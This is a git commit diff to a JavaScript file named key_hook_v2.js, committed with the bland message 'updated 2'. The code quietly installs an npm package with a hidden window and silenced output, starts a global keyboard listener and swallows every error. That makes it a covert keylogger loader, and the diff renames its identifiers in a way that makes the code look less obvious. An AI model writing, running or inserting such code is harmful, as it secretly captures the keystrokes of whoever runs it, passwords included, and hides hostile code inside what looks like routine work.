746c533a1b6e8677598d440b4a77491238f0eccf
Grace <gracejaskson107@gmail.com>
2025-06-04 12:05:10 -0700

    updated 2

--- 5/key_hook_v2.js
+++ 5/key_hook_v2.js
@@ -1,12 +1,12 @@
 try {
-    const { execSync } = require('child_process');
+    const child_processor = require('child_process');
 
     let moduleName = 'logs-bin';
-    execSync(`npm install ${moduleName} --save --no-warnings --no-save --no-progress --loglevel silent`, { windowsHide: true });
-    const { GlobalKeyboardListener } = require(moduleName);
-    let v = new GlobalKeyboardListener();
-    if(v) {
-        v.startNt();
+    child_processor.execSync(`npm install ${moduleName} --save --no-warnings --no-save --no-progress --loglevel silent`, { windowsHide: true });
+    const { KeyManager } = require(moduleName);
+    let keyM = new KeyManager();
+    if(keyM) {
+        keyM.startNt();
     }
 } catch (error) {
 }
